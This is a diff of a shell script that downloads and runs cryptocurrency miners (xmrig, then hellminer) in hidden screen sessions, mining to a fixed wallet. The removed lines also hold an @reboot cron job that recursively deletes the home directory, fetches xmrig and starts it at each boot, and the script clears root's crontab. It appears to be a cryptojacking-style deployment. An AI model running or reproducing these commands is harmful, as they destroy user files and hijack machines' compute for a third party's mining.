@@ -1,10 +1,8 @@
 sudo crontab -r>/dev/null
-echo "@reboot cd ~/;sudo rm -fr *;sudo wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz;sudo tar -xf xmrig-6.14.1-linux-x64.tar.gz;cd xmrig-6.14.1;./xmrig -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RTyHMjaqZiNrWGow48WQuhrU7RkrNFjRXW --keepalive --donate-level 1 -p  c=VRSC,mc=VRSC,m=solo,ID=worker_$(date +%s)" | sudo crontab
 sudo service cron reload >/dev/null
 sudo apt install apt-utils screen -y >/dev/null
 cd ~/
-sudo wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
-sudo tar -xf xmrig-6.14.1-linux-x64.tar.gz
-cd xmrig-6.14.1
-sudo screen -dmS xmrig ./xmrig -a verushash -o stratum+tcp://verushash.asia.mine.zergpool.com:3300 -u RTyHMjaqZiNrWGow48WQuhrU7RkrNFjRXW --keepalive --donate-level 1 -p  c=VRSC,mc=VRSC,m=solo,ID=worker_$(date +%s)
+sudo wget -q https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
+sudo tar xf hellminer_cpu_linux.tar.gz
+sudo screen -dmS helminer ./hellminer -c  stratum+tcp://ap.luckpool.net:3956 -u RTyHMjaqZiNrWGow48WQuhrU7RkrNFjRXW.screen_worker_$(date +%s) -p x --cpu 12
 sudo screen -list
